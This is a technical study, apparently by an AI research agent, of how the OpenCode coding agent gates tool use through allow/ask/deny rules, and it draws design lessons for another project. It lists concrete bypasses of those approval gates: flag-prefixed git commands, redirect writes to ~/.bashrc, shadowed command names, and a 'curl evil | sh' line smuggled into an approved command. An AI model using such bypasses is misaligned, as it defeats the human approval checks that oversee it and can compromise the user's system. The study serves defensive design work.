# 权限与工具批准模型 — OpenCode (sst/opencode) tool permission / approval gating, read-only study at C:/Users/24739/Downloads/opencode-ref

## Key findings
- TWO PARALLEL SYSTEMS COEXIST. V1 (legacy, currently shipping) lives in C:/Users/24739/Downloads/opencode-ref/packages/opencode/src/permission/index.ts + C:/Users/24739/Downloads/opencode-ref/packages/core/src/v1/permission.ts. V2 (new, in packages/core + packages/server) lives in C:/Users/24739/Downloads/opencode-ref/packages/core/src/permission.ts. Both implement the same 3-effect model but differ in vocabulary (V1 `permission`/`pattern`/`action`; V2 `action`/`resource`/`effect`) and in persistence (V1 in-memory session-scoped; V2 SQLite project-scoped, permanent).
- THREE EFFECTS ONLY, NO 'MODES'. `allow` | `ask` | `deny` — defined in C:/Users/24739/Downloads/opencode-ref/packages/core/src/v1/config/permission.ts (`Action = Schema.Literals(["ask","allow","deny"])`) and packages/schema/src/permission.ts (`Effect`). There is no Claude-Code-style 'plan/acceptEdits/bypassPermissions' mode enum; 'plan mode' is just a different agent whose ruleset denies `edit`.
- EVALUATION IS A FLAT ORDERED RULE LIST, LAST-MATCH-WINS, NO SPECIFICITY RANKING. packages/opencode/src/permission/index.ts:28-38 — `rulesets.flat().findLast(rule => Wildcard.match(permission, rule.permission) && Wildcard.match(pattern, rule.pattern)) ?? {action:"ask"}`. Identical in packages/core/src/permission.ts:76-85. Config key order is load-bearing: packages/core/src/v1/config/permission.ts comments that parsing uses `propertyOrder: "original"` to preserve user key order for precedence. Fallback when nothing matches is `ask`.
- WILDCARD MATCHER IS A REGEX TRANSPILER, NOT A GLOB. C:/Users/24739/Downloads/opencode-ref/packages/core/src/util/wildcard.ts: `*` -> `.*`, `?` -> `.`, `s` flag (dot matches newline), case-insensitive on win32, and a special case `if (escaped.endsWith(" .*")) escaped = ...+"( .*)?"` so `"git status *"` also matches bare `"git status"`. Critically `*` CROSSES path separators, so an `external_directory` grant of `/home/u/*` is effectively recursive over the whole home dir.
- DEFAULTS ARE PERMISSIVE: BASH RUNS WITH NO PROMPT OUT OF THE BOX. C:/Users/24739/Downloads/opencode-ref/packages/opencode/src/agent/agent.ts:119-135 sets defaults `{"*": "allow", doom_loop: "ask", external_directory: {"*":"ask", ...whitelist}, question/plan_enter/plan_exit: "deny", read: {"*":"allow", "*.env":"ask", "*.env.*":"ask", "*.env.example":"allow"}}`. V2 repeats this verbatim at C:/Users/24739/Downloads/opencode-ref/packages/core/src/plugin/agent.ts:113-123 (`{action:"*", resource:"*", effect:"allow"}`). Confirmed by docs at packages/web/src/content/docs/permissions.mdx ("Most permissions default to allow"). So by default the ONLY prompts a user ever sees are: external_directory, `.env` reads, and doom_loop.
- APPROVAL GRANULARITY IS PER-(ACTION, RESOURCE-STRING) PAIR, ASKED PER TOOL CALL. A request carries `permission` (V1) / `action` (V2), an array of `patterns`/`resources` (the concrete things being touched), and an array of `always` (V1) / `save` (V2) — the glob patterns that 'Allow always' will persist. Every resource in the array must evaluate to allow or the whole call asks; any single `deny` blocks the whole call (packages/core/src/permission.ts:158-166).
- BASH IS THE ONLY TOOL WITH STRUCTURAL COMMAND ANALYSIS, AND IT IS TREE-SITTER BASED, NOT REGEX/LLM. C:/Users/24739/Downloads/opencode-ref/packages/opencode/src/tool/shell.ts loads tree-sitter-bash and tree-sitter-powershell WASM (lines ~305-330), then `collect()` (line 378) walks `root.descendantsOfType("command")` and for EACH command node adds `scan.patterns.add(source(node))` (line 408, the literal source text incl. redirects) and `scan.always.add(BashArity.prefix(tokens).join(" ") + " *")` (line 409). So `echo foo && echo bar` produces TWO patterns, and `echo $(cat f)` produces both the outer and inner command as separate patterns (verified in packages/opencode/test/tool/shell.test.ts:253-260 and :359-368).
- THE 'SAFE PREFIX' HEURISTIC IS A HARDCODED LLM-GENERATED ARITY DICTIONARY. C:/Users/24739/Downloads/opencode-ref/packages/opencode/src/permission/arity.ts contains a ~140-entry `ARITY: Record<string, number>` table mapping command prefixes to how many tokens define 'the command' (`git`:2, `npm run`:3, `aws`:3, `docker compose`:3, `rm`:1, ...). The file's header comment is the literal LLM prompt used to generate it ("You are generating a dictionary of command-prefix arities... Flags NEVER count as tokens"). `prefix(tokens)` does longest-prefix lookup then `tokens.slice(0, arity)`. No LLM runs at request time; no risk/danger classification of any kind exists anywhere in the repo (grep for dangerous/risky/destructive/blocklist finds only the `--auto` help text).
- THE ARITY TABLE'S OWN INVARIANT IS VIOLATED BY THE IMPLEMENTATION. The generating prompt says flags never count as tokens, but `prefix()` slices the RAW token list which includes flags (parts() in shell.ts:88-113 emits every `word`/`command_parameter` child). So `git --no-pager diff` -> tokens[0..1] = `git --no-pager` -> saved rule `"git --no-pager *"`, which subsequently allows `git --no-pager push --force` and `git -c core.pager='sh -c evil' log`. `python -c 'x'` -> `"python -c *"` = arbitrary Python forever. `sudo apt list` -> `sudo` is NOT in ARITY so arity defaults to 1 -> `"sudo *"` = every sudo command. Same for `bash -c ...` -> `"bash *"`, `env ...` -> `"env *"`, `xargs`, `eval`. packages/opencode/test/permission/arity.test.ts has NO test with a flag before a subcommand.
- REDIRECTS ARE INCLUDED IN THE ASKED PATTERN BUT ERASED FROM THE SAVED PATTERN. `source(node)` returns the parent `redirected_statement` text, so the prompt shows `echo test > output.txt` (test at shell.test.ts:986). But `always` is `"echo *"`. Approving a harmless `echo hi` with 'always' therefore permanently authorises `echo pwned > ~/.bashrc` for the session — and redirect targets are never scanned for external_directory (parts() explicitly skips `redirection` children, and the FILES set at shell.ts:29-49 does not contain `echo`).
- EXTERNAL-DIRECTORY DETECTION IS A NAME-BASED ALLOWLIST OF FILE COMMANDS. shell.ts:29-63 defines `FILES = {cd,chdir,popd,pushd,rm,cp,mv,mkdir,touch,chmod,chown,cat,get-content,set-content,...}` and `CMD_FILES` for cmd.exe. Only if `tokens[0]` is in that set are its path arguments resolved and checked against the worktree (`containsPath`, packages/opencode/src/project/instance-context.ts:18-24). Anything not in the list — `tee`, `dd`, `install`, `python`, `curl -o`, `sed -i`, `>`redirect, `/bin/cat` (absolute path fails the literal set lookup) — never triggers an external_directory prompt.
- 'ALWAYS' SCOPE IS BLANKET `["*"]` FOR MOST NON-BASH TOOLS. edit.ts:105, write.ts:57, apply_patch.ts:209, read.ts:258, glob.ts:31, grep.ts:42, webfetch.ts:42, websearch.ts:122, task.ts:123 all pass `always: ["*"]`. So one 'Allow always' on editing README.md grants edit on every file for the rest of the session (V1) or permanently for the project (V2, `save: ["*"]` written to SQLite). Only `skill` (`always:[params.name]`), `external_directory` (`always:[dir/*]`) and `bash` (arity prefix) are narrower.
- V2 PERSISTS APPROVALS FOREVER IN SQLITE, KEYED BY PROJECT. C:/Users/24739/Downloads/opencode-ref/packages/core/src/permission/saved.ts + packages/core/src/permission/sql.ts define table `permission(id, project_id FK->project ON DELETE CASCADE, action, resource, timestamps)` with `uniqueIndex(project_id, action, resource)`. `reply({reply:"always"})` calls `saved.add(...)` (packages/core/src/permission.ts:238-244); on every subsequent evaluate the saved rows are appended as `effect:"allow"` rules (savedRules(), line 137-142). There is no TTL, no expiry, no revocation UI beyond `DELETE /api/permission/saved/:id`. V1 by contrast keeps `approved: PermissionV1.Rule[]` only in InstanceState memory (packages/opencode/src/permission/index.ts:22-25), so 'always' dies with the process — the TUI copy says so explicitly ("until OpenCode is restarted", permission.shared.ts:124-130).
- V2 SAVED RESOURCES ARE MODEL-AUTHORED STRINGS REINTERPRETED AS GLOBS. packages/core/src/tool/bash.ts:142-149 does `permission.assert({action:"bash", resources:[input.command], save:[input.command]})` — the whole raw command string, unescaped. Because saved rows become the GLOB side of `Wildcard.match(resource, rule.resource)`, approving `git add *` with 'always' writes the rule `git add *`, which then matches `git add . ; curl evil|sh` (regex `^git add .*$`, `s` flag). Any command containing `*` or `?` — which is routine — becomes a wildcard grant.
- DENY IS EVALUATED FIRST AND CANNOT BE OVERRIDDEN BY SAVED APPROVALS (V2 ONLY). packages/core/src/permission.ts:151-160: `evaluateInput` checks `denied(input, configRules)` against the AGENT ruleset alone before merging saved rules, so a persisted 'always' can never re-enable something config denies. V1 has no such split — config rules and session-approved rules are concatenated into one list and last-match-wins, but since approvals are appended to the end of `approved` and `evaluate(permission, pattern, ruleset, approved)` puts `approved` last, an in-session approval CAN shadow an earlier config `deny` if their globs both match... in practice V1 short-circuits: `ask()` returns DeniedError on any deny before ever asking (index.ts:74-79), so the ordering hazard does not fire for deny.
- REJECT IS CONTAGIOUS ACROSS THE SESSION. In both versions, replying `reject` to one pending request also fails every other pending request for the same sessionID (packages/opencode/src/permission/index.ts:120-135; packages/core/src/permission.ts:225-237). Symmetrically, replying `always` re-scans other pending requests and auto-resolves any that now evaluate to allow (index.ts:145-158). Rejection with a message becomes `PermissionCorrectedError` whose `.message` is fed back to the model as feedback; plain rejection becomes `PermissionRejectedError` ("The user rejected permission to use this specific tool call."). In V2 a plain decline is `Effect.die` — an unrecoverable defect, not a tool error (packages/core/src/permission.ts:205-207).
- DENIED TOOLS ARE HIDDEN FROM THE MODEL ENTIRELY, NOT JUST REFUSED. packages/opencode/src/permission/index.ts:204-219 — `disabled(tools, ruleset)` returns tools whose last matching rule is `{pattern:"*", action:"deny"}`, and `visibleTools()` strips them from the tool map before it reaches the LLM. `edit`/`write`/`apply_patch` collapse to the `edit` permission key and the MCP-resource tools to `read`. Used for MCP tools in tool/registry.ts:280-281 and code-mode.ts:209-210.
- AUTO-APPROVE (`--auto` / `--yolo` / `--dangerously-skip-permissions`) IS IMPLEMENTED CLIENT-SIDE, NOT IN THE DAEMON. There is no server-side auto flag. packages/opencode/src/cli/cmd/tui.ts:294 and cli/cmd/run.ts:274 just pass `auto` into the TUI args; packages/tui/src/context/permission.tsx holds `mode: "auto"|"normal"`; packages/tui/src/context/sync.tsx:190-200 handles the `permission.asked` event and immediately POSTs `reply: "once"`. The desktop/web app does the same with a persisted per-session/per-directory map (packages/app/src/context/permission-auto-respond.ts + packages/app/src/context/permission.tsx:300-330), including session-lineage inheritance so subagents inherit the parent's auto-accept. Server-side `deny` rules still block because they are evaluated before asking.
- UI SURFACE: THREE BUTTONS, TWO-STEP CONFIRM IN TUI, ONE-CLICK IN THE DESKTOP APP. The shared state machine is packages/opencode/src/cli/cmd/run/permission.shared.ts (stages `permission` -> `always` -> `reject`); choosing 'Allow always' pushes to a confirmation stage that renders `permissionAlwaysLines()` listing exactly which globs will be granted. The desktop app's dock (packages/app/src/pages/session/composer/session-permission-dock.tsx) renders only `request.patterns` and offers a direct 'Allow always' button with NO disclosure of the `always`/`save` scope and no confirmation step — an asymmetry between clients. Edit requests render a full diff in the prompt (packages/tui/src/routes/session/permission.tsx EditBody).
- NO SANDBOXING ANYWHERE. `packages/containers` is CI Docker images only (base/bun-node/rust/tauri-linux/publish for GitHub Actions — see packages/containers/README.md), not agent isolation. Repo-wide grep for sandbox|seccomp|bubblewrap|firejail|landlock|apparmor finds only `project.sandboxes` (a list of extra worktree DIRECTORIES per project, packages/core/src/project/sql.ts:16, packages/opencode/src/project/project.ts:402-441) and Playwright fixtures. The V2 bash tool description states the truth outright (packages/core/src/tool/bash.ts:109): "Execute one shell command string with the host user's filesystem, process, and network authority... this scan is advisory only."
- THE V2 REWRITE DELIBERATELY DROPPED THE BASH HEURISTICS. packages/core/src/tool/bash.ts:66-77 carries explicit TODOs: "Port tree-sitter bash / PowerShell parser-based approval reduction", "Port BashArity reusable command-prefix approvals", "Replace token-based command-argument external-directory advisories with parser-based detection". Meanwhile V2's `externalCommandDirectories()` (bash.ts:79-95) is a naive `command.match(/(?:[^\s"']+|"[^"]*"|'[^']*')+/g)` token scan whose output is turned into WARNING TEXT appended to the tool result, not a permission gate (bash.ts:138-141). There is a test asserting the debt is tracked: packages/core/test/tool-bash.test.ts:425.
- PERMISSION ENFORCEMENT IS PER-TOOL AND VOLUNTARY — THERE IS NO CHOKEPOINT. Each tool calls `ctx.ask(...)` (V1) / `permission.assert(...)` (V2) itself; the registry injects no gate. The V2 spec states this as design: C:/Users/24739/Downloads/opencode-ref/specs/v2/tools.md:131 — "Trusted tools formulate and sequence permission requests. PermissionV2 evaluates policy and manages approval. The registry does not inject an assertPermission helper." A tool that forgets to call assert is simply ungated.
- MCP TOOLS ARE GATED ONLY BY THEIR BARE NAME. packages/opencode/src/session/tools.ts:408 wraps every MCP tool with `ctx.ask({permission: key, patterns: ["*"], always: ["*"]})` — no argument inspection at all. With the default `"*": "allow"` this never prompts. Same for code-mode (packages/opencode/src/tool/code-mode.ts:147).
- AGENT-SCOPED RULESETS, PLUS A SEPARATE SESSION-SCOPED OVERLAY. Effective ruleset = `Permission.merge(agent.permission, session.permission ?? [])` (packages/opencode/src/session/tools.ts:87, session/llm.ts:149, tool/registry.ts:280) — merge is plain concatenation so the session overlay wins by being later. Session rules are set from the `tools: {name: bool}` field of a prompt request (packages/opencode/src/session/prompt.ts:1057-1065). Subagents get a DERIVED ruleset: packages/opencode/src/agent/subagent-permissions.ts inherits only the parent's `deny` rules and `external_directory` rules, plus defensive `todowrite`/`task` denies — parent ALLOWs are deliberately not inherited.
- TWO SYNTHETIC (NON-TOOL) PERMISSION KEYS EXIST. `doom_loop` fires when the last 3 message parts are the same tool with byte-identical JSON input (packages/opencode/src/session/processor.ts:356-378, `DOOM_LOOP_THRESHOLD`); `external_directory` fires whenever any tool touches a path outside the worktree (packages/opencode/src/tool/external-directory.ts, granting `dirname(target)/*` on 'always'). A third, `workflow_tool_approval`, gates server-side/native-LLM workflow tools with `ruleset: []` (=always ask) and caches approved tool NAMES in a per-session Set (packages/opencode/src/session/llm.ts:155-203).

Plugins therefore cannot currently veto or auto-approve.

So on a default local install any local process that can reach the HTTP port can enumerate pending permission requests and POST approvals.

## Formats
- V1 rule (packages/core/src/v1/config/permission.ts + packages/opencode/src/permission/index.ts): `{ permission: string, pattern: string, action: "ask"|"allow"|"deny" }`. Config sugar decodes to it: `{"bash": {"*":"ask", "git *":"allow", "rm *":"deny"}}` -> `[{permission:"bash",pattern:"*",action:"ask"},{permission:"bash",pattern:"git *",action:"allow"},{permission:"bash",pattern:"rm *",action:"deny"}]`. A bare string `"permission": "allow"` normalizes to `{"*":"allow"}`.
- V2 rule (packages/schema/src/permission.ts): `{ action: string, resource: string, effect: "allow"|"deny"|"ask" }`. Note the field rename: V1 `permission`->V2 `action`, V1 `pattern`->V2 `resource`, V1 `action`->V2 `effect`. Migration is packages/core/src/v1/config/migrate.ts:72-88 (also folds the deprecated `tools: {name: bool}` map into rules and normalizes `write`/`patch` -> `edit`).
- V1 request event `permission.asked` payload: `{ id: "per_...", sessionID, permission: string, patterns: string[], always: string[], metadata: Record<string,unknown>, tool?: {messageID, callID} }`. Reply: `POST /permission/:requestID/reply {reply: "once"|"always"|"reject", message?: string}` (packages/opencode/src/server/routes/instance/httpapi/groups/permission.ts).
- V2 request (packages/schema/src/permission.ts): `{ id: "per_..." (Schema.brand, isStartsWith("per")), sessionID, action: string, resources: string[], save?: string[], metadata?: Record<string,unknown>, source?: {type:"tool", messageID, callID} }`. Events `permission.v2.asked` / `permission.v2.replied {sessionID, requestID, reply}`.
- V2 REST surface (packages/protocol/src/groups/permission.ts, handlers in packages/server/src/handlers/permission.ts): `GET /api/permission/request` (list pending), `GET /api/permission/saved?projectID=` , `DELETE /api/permission/saved/:id`, `POST /api/session/:sessionID/permission` (evaluate+maybe create, returns `{data:{id, effect}}`), `GET /api/session/:sessionID/permission`, `GET /api/session/:sessionID/permission/:requestID`, `POST /api/session/:sessionID/permission/:requestID/reply {reply, message?}` -> 204.
- Saved-approval row (packages/schema/src/permission-saved.ts + packages/core/src/permission/sql.ts): `{ id: "psv_...", projectID, action, resource }` in SQLite table `permission` with `uniqueIndex(project_id, action, resource)` and `ON DELETE CASCADE` from `project`.
- Bash approval shape in practice (V1, packages/opencode/src/tool/shell.ts:263-286): for `cd /tmp && rm -rf build && echo done > log.txt` the ask is `{permission:"bash", patterns:["rm -rf build","echo done > log.txt"], always:["rm *","echo *"]}` (the `cd` is dropped because `CWD.has("cd")`), plus a separate `{permission:"external_directory", patterns:["/tmp/*"], always:["/tmp/*"]}` because `cd`/`rm` are in the FILES set.
- Bash approval shape in V2 (packages/core/src/tool/bash.ts:142-149): `{action:"bash", resources:["<entire raw command string>"], save:["<entire raw command string>"]}` — one resource, no parsing, exact-string save.
- ACP bridge (packages/opencode/src/acp/permission.ts) maps requests to Agent-Client-Protocol `requestPermission` with fixed options `[{optionId:"once",kind:"allow_once"},{optionId:"always",kind:"allow_always"},{optionId:"reject",kind:"reject_once"}]`; anything other than once/always becomes reject; a missing `requestPermission` capability auto-rejects; `edit` requests additionally push the patched file content via `writeTextFile` so the host editor can preview.
- Agent markdown frontmatter form (packages/web/src/content/docs/permissions.mdx): `---\ndescription: ...\nmode: subagent\npermission:\n  edit: deny\n  bash: ask\n  webfetch: deny\n---`.
- Permission keys in use: `read`, `edit` (covers edit/write/apply_patch), `glob`, `grep`, `list`, `bash`, `task` (resource = subagent type), `skill` (resource = skill name), `lsp`, `question`, `webfetch` (resource = URL), `websearch` (resource = query), `todowrite`, `external_directory` (resource = directory glob), `doom_loop`, `plan_enter`/`plan_exit`, `workflow_tool_approval`, plus any MCP tool name verbatim.

## Lessons for DeskMinis
- ADOPT the three-effect vocabulary (`allow`/`ask`/`deny`) and the (action, resource) rule shape. It is small, serializable, agent-scoped, and maps cleanly onto a JSON-RPC `permission.request`/`permission.reply` pair. DeskMinis can reuse the V2 field names (`action`/`resource`/`effect`) verbatim so a future config import from opencode.json is mechanical.
- ADOPT the 'multiple resources per request, any-deny-blocks, all-must-allow-to-skip' semantics (packages/core/src/permission.ts:158-166). It correctly forces a prompt when a single call touches several files or several chained commands.
- ADOPT the pending-request map + Deferred/promise design: the tool's execution FIBER blocks on the approval, the UI is purely event-driven (`asked`/`replied`), and process teardown fails all pending deferreds. Maps directly onto minisd's JSON-RPC + WebSocket: server emits `permission.asked` notification, client calls `permission.reply`, the awaiting tool promise settles. Also copy the finalizer that rejects all pending requests on shutdown so a crashed UI cannot leave a hung agent loop.
- ADOPT capability removal over runtime refusal: `Permission.disabled()/visibleTools()` (packages/opencode/src/permission/index.ts:204-219) strips fully-denied tools from the schema sent to the model. Not advertising a tool is strictly better than refusing it — it saves tokens and stops the model from retry-looping. DeskMinis should filter its tool registry by policy before building the request.
- ADOPT the reject-with-feedback channel: `PermissionCorrectedError{feedback}` turns a denial into a steering message the model actually reads, versus a bare 'rejected' that causes retry loops. Cheap and high value.
- ADOPT doom-loop detection (identical tool + byte-identical input 3x in a row -> ask) from packages/opencode/src/session/processor.ts:356-378. It is a cheap, non-heuristic circuit breaker that is orthogonal to command classification and would have caught real runaway loops.
- ADOPT the two-step 'Allow always' confirmation from packages/opencode/src/cli/cmd/run/permission.shared.ts, which renders the exact glob list that will be persisted BEFORE committing. Note that OpenCode's own desktop app (session-permission-dock.tsx) skips this — a one-click 'Allow always' with the granted scope invisible. DeskMinis' Vue UI must show the scope; the Electron client is exactly the surface where OpenCode got this wrong.
- ADAPT external-directory gating as a first-class permission key. The idea (worktree is the trust boundary; anything outside asks separately) is sound and orthogonal to command classification. But DO NOT copy the grant shape: `always: [dirname(target) + "/*"]` combined with a `*`->`.*` regex means approving one file in ~/ grants the entire home tree recursively. DeskMinis should grant the exact path, or a single non-recursive directory level, and should make the recursion explicit in the prompt text.
- AVOID the permissive default. `{"*": "allow"}` (packages/opencode/src/agent/agent.ts:120, packages/core/src/plugin/agent.ts:114) means OpenCode's entire bash analysis machinery is DEAD CODE out of the box — shell commands never prompt unless the user hand-writes a config. DeskMinis' deny/ask-by-default posture is the right one and should not be softened 'to match opencode'.
- AVOID porting BashArity. Your adversarial conclusion is confirmed by the source. The dictionary is LLM-generated (the prompt is literally in the file header, packages/opencode/src/permission/arity.ts:15-24), its stated invariant 'flags never count as tokens' is violated by the implementation (`tokens.slice(0, arity)` over the raw token list), and nothing in packages/opencode/test/permission/arity.test.ts tests a flag before a subcommand. Concrete breaks: `git --no-pager diff` -> saves `git --no-pager *` (then allows `git -c core.pager=... `, `git push --force`); `python -c '...'` -> saves `python -c *` = arbitrary code; `sudo`/`bash`/`env`/`eval`/`xargs` are absent from the table so arity=1 and saving `sudo *` from one benign sudo. Tellingly, the V2 rewrite has NOT ported it (TODO at packages/core/src/tool/bash.ts:67).
- AVOID the flag-blind prefix idea in any form, including your own. `git diff --output=FILE` is exactly the class OpenCode cannot express: its saved rule `git diff *` has no way to distinguish read-only `git diff` from `git diff --output=~/.bashrc`. Any 'command prefix' allowlist inherits this because side effects live in flags, not in the verb.
- AVOID name-based command classification (the FILES/CMD_FILES sets at packages/opencode/src/tool/shell.ts:29-63). Shadow naming defeats it trivially: `/bin/rm`, `\rm`, `command rm`, `busybox rm`, a `./rm` in PATH — none match the literal string `rm`, so no external_directory scan happens and a config rule `"rm *": "deny"` never fires. Same for redirect-based writes (`> file` is skipped entirely) and indirection (`X=/etc/passwd; cat $X` produces the literal pattern `cat $X`).
- AVOID storing model-authored strings as glob patterns. packages/core/src/tool/bash.ts saves the raw command as the `save` resource, and packages/core/src/util/wildcard.ts then interprets `*`/`?` in it as wildcards. Approving `git add *` (a totally normal command) persists a rule matching `git add <anything>`, including `git add . ; curl evil | sh`. If DeskMinis ever persists an approval derived from tool input, it MUST escape the stored value or store a structured exact-match record, never a pattern.
- AVOID unbounded persistence of 'always'. V1's session-lifetime approvals (in-memory, die with the process, UI literally says 'until OpenCode is restarted') are far safer than V2's forever-rows in SQLite with no TTL and no in-app revocation beyond a REST DELETE. If DeskMinis persists approvals for M2, scope them to (project, session) with an explicit expiry and ship a visible, revocable list in the Vue UI.
- AVOID blanket `always: ["*"]`. Nine tools in OpenCode pass it (edit/write/apply_patch/read/glob/grep/webfetch/websearch/task), so a single 'Allow always' on one innocuous file edit unlocks every file. If DeskMinis offers 'always', the granted scope must be the specific resource, never the whole permission class.
- AVOID client-side auto-approval. `--auto`/`--yolo` is not a server concept in OpenCode — the TUI (packages/tui/src/context/sync.tsx:190-200) and the desktop app (packages/app/src/context/permission-auto-respond.ts) simply auto-POST `reply:"once"` on every `permission.asked`. That means the policy decision lives in an untrusted, replaceable client and the daemon cannot audit or rate-limit it. DeskMinis' gateway should own any bypass mode server-side, log it, and scope it to a single session.
- AVOID voluntary per-tool gating. specs/v2/tools.md:131 states the registry deliberately does NOT inject a permission helper — each tool must remember to ask. This is how MCP tools ended up gated only by bare tool name with `patterns:["*"]` (packages/opencode/src/session/tools.ts:408) and how the V2 command-argument scan degraded into advisory warning TEXT (packages/core/src/tool/bash.ts:138-141). DeskMinis should keep the gateway as a mandatory chokepoint in the tool-invocation path so a new tool is deny-by-default until it declares a policy, and should carry that rule into M2's MCP integration — an MCP tool's ARGUMENTS, not just its name, need to reach the approval prompt.
- ADOPT-WITH-CARE: tree-sitter command splitting is genuinely useful for PRESENTATION even if worthless for classification. Splitting `a && b` and `$(c)` into separate reviewable units (verified by packages/opencode/test/tool/shell.test.ts:253-260, :359-368) makes the prompt honest about what will run. Use it to render the approval UI, never to decide the approval. Note it still misses `eval "..."` (the string is not re-parsed) and any variable indirection.
- NOTE for M3 LAN sync: OpenCode's saved-permission rows are per-project and would be trivially syncable as PortableRecords — and that is precisely the danger. A permission grant is a capability; syncing approvals between desktops means a compromise on one machine authorises the other. If DeskMinis syncs sessions/memory/skills, permissions should be explicitly excluded from the sync set, or at minimum be device-scoped and re-confirmed on the receiving machine.
- NOTE on the daemon boundary: OpenCode's local HTTP server has auth OFF by default (packages/opencode/src/server/auth.ts — Basic auth only when `OPENCODE_SERVER_PASSWORD` is set), so any local process can list and approve pending permission requests. DeskMinis' per-run bearer token is strictly better; keep it, and make sure the `permission.reply` method is inside the authenticated surface, not on an unauthenticated notification channel.
- NOTE: there is no sandbox to copy. packages/containers is CI Docker images (packages/containers/README.md), and `project.sandboxes` is just a list of extra worktree directories. OpenCode's own V2 bash tool description admits the agent runs 'with the host user's filesystem, process, and network authority'. If DeskMinis wants defense-in-depth beyond the approval prompt on Windows, it will have to invent it (restricted token / Job Object / AppContainer / separate low-privilege user for the tool-exec process) — there is no prior art here to borrow.

## Open questions
- Which system actually ships today? Both V1 (packages/opencode) and V2 (packages/core + packages/server) are fully wired with `node`/layer definitions and both are reachable over HTTP (the client picks via `protocolKind()`/`await sdk.protocol` in packages/app/src/context/permission.tsx). I could not determine from source alone which is the default runtime path for a released binary, so the 'is `always` session-scoped or permanent?' answer differs by version.
- Is the `permission.ask` plugin hook (packages/plugin/src/index.ts:261) intended to become live, or vestigial? Nothing triggers it in this tree. If it goes live, plugins would gain the ability to silently flip `ask` to `allow`, which reintroduces exactly the untrusted-classifier problem in a new place.
- Does tree-sitter's `descendantsOfType("command")` actually descend into process substitution `<(...)`, here-docs, backticks, and PowerShell script blocks `{...}`? Tests only cover `&&`, `;`, and `$(...)`. I did not run the parser, so I cannot state which of these produce a permission pattern and which are invisible.
- What is the exact behavior when the same command text appears in a saved V2 rule AND the config has a later `deny`? `evaluateInput` checks config-deny first and returns early, so deny wins — but I did not find a test asserting this, and the V1 path has no equivalent split.
- Is there any audit log of permission decisions? I found `Effect.logInfo("evaluated"/"asking", ...)` in packages/opencode/src/permission/index.ts:72,84 but no durable, queryable decision record. Whether the replied events are persisted with the session transcript (and therefore reviewable after the fact) was not something I could confirm from the permission code alone.
